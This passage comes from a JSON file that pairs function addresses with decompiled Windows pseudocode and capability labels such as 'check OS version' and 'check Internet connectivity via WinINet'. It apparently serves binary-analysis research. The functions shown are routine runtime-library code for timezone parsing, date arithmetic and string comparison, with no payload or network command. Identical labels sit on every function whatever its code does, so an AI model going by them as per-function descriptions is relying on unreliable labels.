!= 0);\n        }\n        noname_3 = var_24h + 0x100;\n        iVar3 = fcn.00406450(1, var_1ch, 0x100, noname_3, 0, 0, 0, unaff_ESI, unaff_EBX, unaff_EDI, noname_3, var_20h, \n                             var_1ch, var_18h, _auStack24);\n        if (iVar3 == 0) goto code_r0x00407eda;\n        *(var_24h + 0xfe) = 0;\n        if ((1 < *0x45d200) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                if (*puVar4 == 0) break;\n                uVar5 = puVar4[-1];\n                if (uVar5 <= *puVar4) {\n                    puVar6 = var_24h + 0x100 + uVar5 * 2;\n                    do {\n                        *puVar6 = 0x8000;\n                        uVar5 = uVar5 + 1;\n                        puVar6 = puVar6 + 1;\n                    } while (uVar5 <= *puVar4);\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        fcn.00404590(var_24h, var_24h + 0x200, 0xfe);\n        *0x45d100 = noname_3;\n        *0x45d7d4 = var_24h + 0xfe;\n        *0x45d7d8 = var_20h;\n    }\n    fcn.00401512(var_1ch);\ncode_r0x00407f07:\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 1429
    },
    "004080c2": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004080c2(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    if ((param_1 == NULL) || (*param_1 == '\\0')) {\ncode_r0x0040810a:\n        uVar2 = 0x1004;\ncode_r0x00408115:\n        iVar1 = (**0x45d6dc)(*0x45d6c4, uVar2, &var_ch, 8);\n        if (iVar1 == 0) goto code_r0x0040812f;\n        param_1 = &var_ch;\n    }\n    else {\n        iVar1 = fcn.00407fc0(param_1, 0x40d770);\n        if (iVar1 == 0) goto code_r0x0040810a;\n        iVar1 = fcn.00407fc0(param_1, 0x40d76c);\n        if (iVar1 == 0) {\n            uVar2 = 0xb;\n            goto code_r0x00408115;\n        }\n    }\n    fcn.00409627(param_1);\ncode_r0x0040812f:\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 306
    },
    "00408327": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408327(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    iVar1 = (**0x45d6dc)(arg_8h & 0x3ff | 0x400, 1, &var_7ch, 0x78);\n    if (((iVar1 != 0) && (uVar2 = fcn.0040823d(),  arg_8h != uVar2)) && (arg_ch != 0)) {\n        fcn.00403df0(*0x45d6d8);\n        fcn.00408272();\n    }\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 200
    },
    "004085ba": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004085ba(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint var_7ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.0040823d();\n    iVar1 = (**0x45d6dc)(arg_8h_00, (-(*0x45d6c8 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x45d6bc = 0;\n        goto code_r0x0040867a;\n    }\n    iVar1 = fcn.004095be(*0x45d6d8, &var_7ch);\n    if (iVar1 == 0) {\n        if (*0x45d6c8 == 0) {\n            iVar1 = 1;\n            goto code_r0x0040864e;\n        }\n    }\n    else {\n        if (((*0x45d6c8 != 0) || (*0x45d6d4 == 0)) ||\n           (iVar1 = fcn.0040975b(*0x45d6d8, &var_7ch, *0x45d6d4),  iVar1 != 0)) goto code_r0x0040867a;\ncode_r0x0040864e:\n        iVar1 = fcn.00408327(arg_8h_00, iVar1);\n        if (iVar1 == 0) goto code_r0x0040867a;\n    }\n    *0x45d6bc = *0x45d6bc | 4;\n    *0x45d6c0 = arg_8h_00;\n    *0x45d6c4 = arg_8h_00;\ncode_r0x0040867a:\n    fcn.00403eac();\n    return;\n}\n",
        "token_count": 460
    },
    "00408d94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.00408d94(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    char *pcVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004026d8(0x40d7d8, 0x18);\n    *(unaff_EBP + -0x20) = 0;\n    fcn.004029d8(7);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = *0x45d6a0;\n    *(unaff_EBP + -0x28) = *0x45d6a0;\n    *0x45d7b4 = 0;\n    *0x45d2b4 = 0xffffffff;\n    *0x45d2a8 = 0xffffffff;\n    pcVar4 = fcn.0040993c(0x40d7d4);\n    *(unaff_EBP + -0x24) = pcVar4;\n    if ((pcVar4 == NULL) || (*pcVar4 == '\\0')) {\n        if (*0x45d7b8 != 0) {\n            fcn.00401512(*0x45d7b8);\n            *0x45d7b8 = 0;\n        }\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(0x45d708);\n        pcVar2 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n        if (iVar5 != -1) {\n            *0x45d7b4 = 1;\n            *0x45d210 = *0x45d708 * 0x3c;\n            if (*0x45d74e != 0) {\n                *0x45d210 = *0x45d210 + *0x45d75c * 0x3c;\n            }\n            if ((*0x45d7a2 == 0) || (*0x45d7b0 == 0)) {\n                *0x45d214 = 0;\n                *0x45d218 = 0;\n            }\n            else {\n                *0x45d214 = 1;\n                *0x45d218 = (*0x45d7b0 - *0x45d75c) * 0x3c;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                              (uVar3, 0, 0x45d70c, 0xffffffff, *0x45d2a0, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x45d2a0 = 0;\n            }\n            else {\n                (*0x45d2a0)[0x3f] = 0;\n            }\n            iVar5 = (*pcVar2)(uVar3, 0, 0x45d760, 0xffffffff, *0x45d2a4, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x45d2a4 = 0;\n            }\n            else {\n                (*0x45d2a4)[0x3f] = 0;\n            }\n        }\n    }\n    else {\n        if (*0x45d7b8 != 0) {\n            iVar5 = fcn.00407fc0(pcVar4, *0x45d7b8);\n            if (iVar5 == 0) goto code_r0x00408f98;\n            if (*0x45d7b8 != 0) {\n                fcn.00401512(*0x45d7b8);\n            }\n        }\n        iVar5 = fcn.00403df0(pcVar4);\n        *0x45d7b8 = fcn.0040162a(iVar5 + 1);\n        if (*0x45d7b8 != 0) {\n            fcn.00403bc0(*0x45d7b8, pcVar4);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00408faf();\n            fcn.00403cc0(*0x45d2a0, pcVar4, 3);\n            (*0x45d2a0)[3] = 0;\n            pcVar6 = pcVar4 + 3;\n            if (*pcVar6 == '-') {\n                *(unaff_EBP + -0x20) = 1;\n                pcVar6 = pcVar4 + 4;\n            }\n            *0x45d210 = fcn.00409627(pcVar6);\n            *0x45d210 = *0x45d210 * 0xe10;\n            for (; (cVar1 = *pcVar6,  cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':')))); pcVar6 = pcVar6 + 1) {\n            }\n            if (*pcVar6 == ':') {\n                pcVar6 = pcVar6 + 1;\n                iVar5 = fcn.00409627(pcVar6);\n                *0x45d210 = *0x45d210 + iVar5 * 0x3c;\n                for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                }\n                if (*pcVar6 == ':') {\n                    pcVar6 = pcVar6 + 1;\n                    iVar5 = fcn.00409627(pcVar6);\n                    *0x45d210 = *0x45d210 + iVar5;\n                    for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                    }\n                }\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                *0x45d210 = -*0x45d210;\n            }\n            *0x45d214 = *pcVar6;\n            if (*0x45d214 == 0) {\n                **0x45d2a4 = 0;\n            }\n            else {\n                fcn.00403cc0(*0x45d2a4, pcVar6, 3);\n                (*0x45d2a4)[3] = 0;\n            }\n            goto code_r0x00409036;\n        }\n    }\ncode_r0x00408f98:\n    fcn.004055b2(unaff_EBP + -0x10, 0xffffffff);\ncode_r0x00409036:\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 1675
    },
    "0040903c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040903c(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h % 4;\n    if (arg_ch == 1) {\n        if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n            iVar4 = *(in_EAX * 4 + 0x45d2bc);\n        }\n        else {\n            iVar4 = *(in_EAX * 4 + 0x45d2f0);\n        }\n        iVar5 = iVar4 + 1;\n        iVar3 = (arg_10h * 0x16d + -0x63db + (arg_10h + -1) / 4 + iVar5 + ((arg_10h + 299) / 400 - (arg_10h + -1) / 100)\n                ) % 7;\n        iVar1 = (arg_14h * 7 - iVar3) + arg_18h;\n        if (iVar3 <= arg_18h) {\n            iVar5 = iVar4 + -6;\n        }\n        iVar5 = iVar5 + iVar1;\n        if (arg_14h == 5) {\n            if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n                iVar1 = *(in_EAX * 4 + 0x45d2c0);\n            }\n            else {\n                iVar1 = *(in_EAX * 4 + 0x45d2f4);\n            }\n            if (iVar1 < iVar5) {\n                iVar5 = iVar5 + -7;\n            }\n        }\n    }\n    else {\n        if (((iVar2 == 0) && (iVar1 = arg_10h / 100,  arg_10h % 100 != 0)) ||\n           (iVar1 = (arg_10h + 0x76c) / 400,  (arg_10h + 0x76c) % 400 == 0)) {\n            iVar5 = *(in_EAX * 4 + 0x45d2bc);\n        }\n        else {\n            iVar5 = *(in_EAX * 4 + 0x45d2f0);\n        }\n        iVar5 = iVar5 + arg_1ch;\n    }\n    iVar2 = (in_ECX * 0x3c + arg_20h) * 0x3c;\n    if (arg_8h == 1) {\n        *0x45d2b0 = (iVar2 + arg_24h) * 1000 + arg_28h;\n        *0x45d2a8 = arg_10h;\n        *0x45d2ac = iVar5;\n    }\n    else {\n        *0x45d2bc = (iVar2 + *0x45d218 + arg_24h) * 1000 + arg_28h;\n        if (*0x45d2bc < 0) {\n            *0x45d2bc = *0x45d2bc + 86400000;\n            *0x45d2b8 = iVar5 + -1;\n        }\n        else {\n            iVar1 = 86400000;\n            *0x45d2b8 = iVar5;\n            if (86399999 < *0x45d2bc) {\n                *0x45d2bc = *0x45d2bc + -86400000;\n                *0x45d2b8 = iVar5 + 1;\n            }\n        }\n        *0x45d2b4 = arg_10h;\n    }\n    return iVar1;\n}\n",
        "token_count": 968
    },
    "004095be": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004095be(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00402306();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x45cdfc) {\n        iVar1 = fcn.00404d2d();\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.00409440(arg_8h, arg_ch);\n    }\n    else {\n        do {\n            iVar2 = fcn.00409f54(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00409f54(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            if (iVar2 == 0) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 254
    },
    "0040975b": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040975b(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00402306();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x45cdfc) {\n        iVar1 = fcn.00404d2d();\n    }\n    if (arg_10h == 0) {\n        iVar2 = 0;\n    }\n    else if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.0040a120(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        do {\n            iVar2 = fcn.00409f54(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00409f54(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n            if ((arg_10h == 0) || (iVar2 == 0)) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 315
    },
    "004097da": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004097da(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint64_t uVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    char cVar4;\n    \n    pcVar2 = param_1;\n    if (param_3 != 0) {\n        *param_1 = '-';\n        param_1 = param_1 + 1;\n        in_EAX = -in_EAX;\n        pcVar2 = param_1;\n    }\n    do {\n        pcVar3 = pcVar2;\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / param_2;\n        cVar4 = uVar1 % param_2;\n        if (uVar1 % param_2 < 10) {\n            cVar4 = cVar4 + '0';\n        }\n        else {\n            cVar4 = cVar4 + 'W';\n        }\n        *pcVar3 = cVar4;\n        pcVar2 = pcVar3 + 1;\n    } while (in_EAX != 0);\n    pcVar3[1] = '\\0';\n    do {\n        cVar4 = *pcVar3;\n        *pcVar3 = *param_1;\n        pcVar3 = pcVar3 + -1;\n        *param_1 = cVar4;\n        param_1 = param_1 + 1;\n    } while (param_1 < pcVar3);\n    return;\n}\n",
        "token_count": 340
    },
    "00409f54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00409f54(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_3;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    if ((*(arg_8h + 0x14) == 0) || ((*(arg_8h + 0x24) != 0 && (arg_ch < 0x80)))) {\n        if ((0x40 < arg_ch) && (arg_ch < 0x5b)) {\n            return arg_ch + 0x20;\n        }\n    }\n    else {\n        noname_3 = 1;\n        var_4h = in_ECX;\n        if (arg_ch < 0x100) {\n            if (*(arg_8h + 0x28) < 2) {\n                uVar3 = *(*(arg_8h + 0x48) + arg_ch * 2) & 1;\n            }\n            else {\n                uVar3 = fcn.0040a03e(arg_8h, arg_ch, 1);\n            }\n            if (uVar3 == 0) {\n                return uVar2;\n            }\n        }\n        if ((*(*(uVar1 + 0x48) + 1 + (uVar2 >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            arg_8h = arg_8h & 0xffff0000 | uVar2 & 0xff;\n        }\n        else {\n            arg_8h = arg_8h & 0xff000000 | CONCAT11(uVar2, uVar2 >> 8);\n            noname_3 = 2;\n        }\n        iVar4 = fcn.0040607a(*(uVar1 + 0x14), 0x100, &arg_8h, noname_3, &var_4h, 3, *(uVar1 + 4), 1, unaff_EDI, \n                             unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                             in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                             in_stack_00000030, in_stack_00000034);\n        if (iVar4 != 0) {\n            if (iVar4 != 1) {\n                return CONCAT11(var_4h, var_4h._1_1_);\n            }\n            return var_4h & 0xff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 839
    },
    "0040a225": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a225(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    \n    iVar1 = fcn.00402306();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x45d7f4) {\n        iVar1 = fcn.00404203();\n    }\n    if (arg_10h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.0040a31f(*(iVar1 + 0xc), 1, arg_8h, arg_10h, arg_ch, arg_10h, *(iVar1 + 4), unaff_EBP, unaff_retaddr, \n                         arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n    if (iVar1 == 0) {\n        return 0x7fffffff;\n    }\n    return iVar1 + -2;\n}\n",
        "token_count": 514
    },
    "0040a303": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040a303(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_1;\n    if (param_1 != 0) {\n        do {\n            iVar1 = iVar1 + -1;\n            if (*in_EAX == '\\0') goto code_r0x0040a317;\n            in_EAX = in_EAX + 1;\n        } while (iVar1 != 0);\n    }\n    iVar1 = iVar1 + -1;\ncode_r0x0040a317:\n    return (param_1 - iVar1) + -1;\n}\n",
        "token_count": 144
    },
    "0040a31f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_48h_3\n// WARNING: Variable defined which should be unmapped: var_44h_2\n// WARNING: Variable defined which should be unmapped: lpString1\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_48h_2\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: lpMultiByteStr\n// WARNING: Variable defined which should be unmapped: var_50h_2\n// WARNING: Variable defined which should be unmapped: var_54h\n\nvoid __cdecl\nfcn.0040a31f(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_8h, uint arg_ch, uint arg_10h, uint cbMultiByte, uint arg_18h, \n            uint cchCount2, uint CodePage)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint *arg_8h_00;\n    int32_t iVar6;\n    uint32_t unaff_EBP;\n    int32_t iVar7;\n    uint unaff_retaddr;\n    uint Locale;\n    uint dwCmpFlags;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_20h_2;\n    uint lpString2;\n    uint lpCPInfo;\n    uint var_4h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_4h;\n    uint var_58h;\n    uint var_50h_3;\n    uint var_48h_3;\n    uint var_44h_2;\n    uint lpString1;\n    uint var_34h_3;\n    uint var_30h_2;\n    uchar auStack48 [2];\n    uint var_2ah;\n    int32_t var_54h;\n    int32_t var_50h_2;\n    uint var_48h_2;\n    uint var_64h;\n    uint var_38h;\n    uint lpMultiByteStr;\n    uint uVar8;\n    \n    uVar8 = 0x48;\n    fcn.004026d8();\n    *(unaff_EBP - 0x1c) = *0x45cca0 ^ unaff_EBP;\n    puVar5 = *(unaff_EBP + 0x10);\n    *(unaff_EBP - 0x3c) = puVar5;\n    puVar4 = *(unaff_EBP + 0x18);\n    *(unaff_EBP - 0x34) = puVar4;\n    iVar7 = 0;\n    if (*0x45d7d0 == 0) {\n        var_50h_2 = 0x40a35e;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CompareStringW)();\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x78) {\n                *0x45d7d0 = 2;\n            }\n        }\n        else {\n            *0x45d7d0 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        uVar3 = fcn.0040a303();\n        *(unaff_EBP + 0x14) = uVar3;\n    }\n    iVar2 = *(unaff_EBP + 0x1c);\n    if (0 < iVar2) {\n        iVar2 = fcn.0040a303();\n        *(unaff_EBP + 0x1c) = iVar2;\n    }\n    if ((*0x45d7d0 == 2) || (*0x45d7d0 == 0)) {\n        *(unaff_EBP - 0x40) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            *(unaff_EBP + 8) = *0x45d690;\n        }\n        iVar2 = *(unaff_EBP + 0x20);\n        if (*(unaff_EBP + 0x20) == 0) {\n            iVar2 = *0x45d6a0;\n        }\n        iVar6 = fcn.00408a90(*(unaff_EBP + 8));\n        if (iVar6 == -1) goto code_r0x0040a696;\n        if (iVar6 != iVar2) {\n            var_50h_2 = 0x40a62f;\n            iVar7 = fcn.00408ad7(iVar2, iVar6, *(unaff_EBP - 0x3c), unaff_EBP + 0x14, 0, 0, 0x40d848, uVar8, \n                                 unaff_retaddr);\n            if (iVar7 == 0) goto code_r0x0040a696;\n            var_50h_2 = 0x40a64a;\n            iVar2 = fcn.00408ad7(iVar2, iVar6, *(unaff_EBP - 0x34), unaff_EBP + 0x1c, 0, 0, 0x40d848, uVar8, \n                                 unaff_retaddr);\n            *(unaff_EBP - 0x40) = iVar2;\n            if (iVar2 == 0) {\n                fcn.00401512(iVar7);\n                goto code_r0x0040a696;\n            }\n            *(unaff_EBP - 0x3c) = iVar7;\n            *(unaff_EBP - 0x34) = *(unaff_EBP - 0x40);\n        }\n        var_50h_2 = 0x40a67e;\n        (*_sym.imp.KERNEL32.dll_CompareStringA)();\n        if (iVar7 != 0) {\n            var_54h = 0x40a68a;\n            var_50h_2 = iVar7;\n            fcn.00401512(iVar7);\n            var_54h = *(unaff_EBP - 0x40);\n            stack0xffffffd4 = 0x40a692;\n            fcn.00401512(var_54h);\n        }\n        goto code_r0x0040a696;\n    }\n    if (*0x45d7d0 != 1) goto code_r0x0040a696;\n    *(unaff_EBP - 0x50) = 0;\n    *(unaff_EBP - 0x44) = 0;\n    *(unaff_EBP - 0x48) = 0;\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x45d6a0;\n    }\n    if ((*(unaff_EBP + 0x14) == 0) || (iVar2 == 0)) {\n        if ((*(unaff_EBP + 0x14) == iVar2) ||\n           (((1 < iVar2 || (1 < *(unaff_EBP + 0x14))) || (iVar7 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(),  iVar7 == 0))))\n        goto code_r0x0040a696;\n        if (0 < *(unaff_EBP + 0x14)) {\n            if (1 < *(unaff_EBP - 0x30)) {\n                puVar4 = unaff_EBP - 0x2a;\n                uVar1 = *(unaff_EBP - 0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) && ((*puVar5 < *puVar4 || (puVar4[1] < *puVar5))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x0040a696;\n        }\n        if (0 < *(unaff_EBP + 0x1c)) {\n            if (1 < *(unaff_EBP - 0x30)) {\n                puVar5 = unaff_EBP - 0x2a;\n                uVar1 = *(unaff_EBP - 0x2a);\n                while (((uVar1 != 0 && (puVar5[1] != 0)) && ((uVar1 = *puVar4,  uVar1 < *puVar5 || (puVar5[1] < uVar1)))\n                       )) {\n                    puVar5 = puVar5 + 2;\n                    uVar1 = *puVar5;\n                }\n            }\n            goto code_r0x0040a696;\n        }\n    }\n    var_50h_2 = 0x40a49c;\n    iVar7 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    *(unaff_EBP - 0x4c) = iVar7;\n    if (iVar7 == 0) goto code_r0x0040a696;\n    *(unaff_EBP - 4) = 0;\n    var_50h_2 = 0x40a4ba;\n    fcn.00402830();\n    *(unaff_EBP - 0x18) = &stack0xffffffe0;\n    *(unaff_EBP - 0x38) = &stack0xffffffe0;\n    *(unaff_EBP - 4) = 0xffffffff;\n    iVar2 = *(unaff_EBP - 0x38);\n    if (iVar2 == 0) {\n        var_50h_2 = iVar7 * 2;\n        var_54h = 0x40a4f4;\n        iVar2 = fcn.0040162a();\n     